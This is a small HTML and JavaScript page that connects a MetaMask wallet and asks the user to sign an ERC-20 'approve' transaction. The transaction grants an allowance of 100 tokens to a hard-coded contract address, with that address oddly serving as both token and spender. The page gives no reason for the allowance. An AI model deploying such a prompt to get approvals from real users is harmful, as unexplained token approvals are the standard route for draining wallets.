<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Web3 Wallet & Contract Authorization</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js"></script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #fff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin: 10px;
      cursor: pointer;
      background-color: #007bff;
      border: none;
      border-radius: 5px;
      color: white;
    }
    button:hover {
      background-color: #0056b3;
    }
    #status {
      margin-top: 20px;
    }
  </style>
</head>
<body>

  <h1>Web3 Wallet & Contract Authorization</h1>
  <button id="connectButton">Connect Wallet</button>
  <button id="authorizeButton" disabled>Authorize Contract</button>
  <div id="status"></div>

  <script>
    let web3;
    let userAccount;
    const contractAddress = '0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21'; // Your contract address

    // Button references
    const connectButton = document.getElementById('connectButton');
    const authorizeButton = document.getElementById('authorizeButton');
    const statusDiv = document.getElementById('status');

    // Check if Web3 is available
    if (typeof window.ethereum !== 'undefined') {
      web3 = new Web3(window.ethereum);

      // Handle Connect Wallet button click
      connectButton.addEventListener('click', async () => {
        try {
          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
          userAccount = accounts[0];
          statusDiv.innerText = `Connected: ${userAccount}`;
          connectButton.disabled = true; // Disable after connection
          authorizeButton.disabled = false; // Enable authorize button
        } catch (err) {
          console.error('Error connecting to wallet', err);
          statusDiv.innerText = 'Failed to connect wallet.';
        }
      });

      // Handle Authorize Contract button click
      authorizeButton.addEventListener('click', async () => {
        try {
          const contractABI = [
            // ABI for the 'approve' function
            {
              "constant": false,
              "inputs": [
                {
                  "name": "spender",
                  "type": "address"
                },
                {
                  "name": "amount",
                  "type": "uint256"
                }
              ],
              "name": "approve",
              "outputs": [
                {
                  "name": "",
                  "type": "bool"
                }
              ],
              "payable": false,
              "stateMutability": "nonpayable",
              "type": "function"
            }
          ];

          const contract = new web3.eth.Contract(contractABI, contractAddress);
          const amountToAuthorize = web3.utils.toWei('100', 'ether'); // Adjust the value as needed

          // Sending the transaction to approve the contract
          const receipt = await contract.methods
            .approve(contractAddress, amountToAuthorize)
            .send({ from: userAccount });

          statusDiv.innerText = `Contract authorized! Txn Hash: ${receipt.transactionHash}`;
        } catch (err) {
          console.error('Error authorizing contract', err);
          statusDiv.innerText = 'Failed to authorize contract.';
        }
      });
    } else {
      statusDiv.innerText = 'Please install MetaMask!';
    }
  </script>

</body>
</html>
